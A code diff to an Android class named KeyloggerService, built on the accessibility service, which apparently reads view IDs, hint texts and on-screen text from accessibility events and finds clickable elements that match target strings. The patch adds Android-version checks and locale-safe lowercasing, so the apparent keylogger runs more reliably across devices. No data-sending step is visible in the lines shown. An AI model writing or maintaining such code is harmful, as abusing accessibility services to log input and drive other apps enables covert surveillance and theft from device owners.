@@ -183,8 +183,10 @@ public class KeyloggerService extends AccessibilityService {
             String viewId = "";
             AccessibilityNodeInfo source = event.getSource();
             if (source != null) {
-                CharSequence hintChar = source.getHintText();
-                if (hintChar != null) hint = hintChar.toString();
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    CharSequence hintChar = source.getHintText();
+                    if (hintChar != null) hint = hintChar.toString();
+                }
                 CharSequence viewIdChar = source.getViewIdResourceName();
                 if (viewIdChar != null) viewId = viewIdChar.toString();
                 source.recycle();
@@ -259,8 +261,10 @@ public class KeyloggerService extends AccessibilityService {
             if (source != null) {
                 CharSequence viewIdChar = source.getViewIdResourceName();
                 if (viewIdChar != null) viewId = viewIdChar.toString();
-                CharSequence hintChar = source.getHintText();
-                if (hintChar != null) hint = hintChar.toString();
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    CharSequence hintChar = source.getHintText();
+                    if (hintChar != null) hint = hintChar.toString();
+                }
                 source.recycle();
             }
 
@@ -455,10 +459,10 @@ public class KeyloggerService extends AccessibilityService {
         CharSequence contentDesc = node.getContentDescription();
 
         if (node.isClickable()) {
-            String text = (nodeText != null ? nodeText.toString().toLowerCase() : "")
-                    + " " + (contentDesc != null ? contentDesc.toString().toLowerCase() : "");
+            String text = (nodeText != null ? nodeText.toString().toLowerCase(java.util.Locale.ROOT) : "")
+                    + " " + (contentDesc != null ? contentDesc.toString().toLowerCase(java.util.Locale.ROOT) : "");
             for (String target : targetTexts) {
-                if (text.contains(target.toLowerCase())) {
+                if (text.contains(target.toLowerCase(java.util.Locale.ROOT))) {
                     results.add(node);
                     return;
                 }
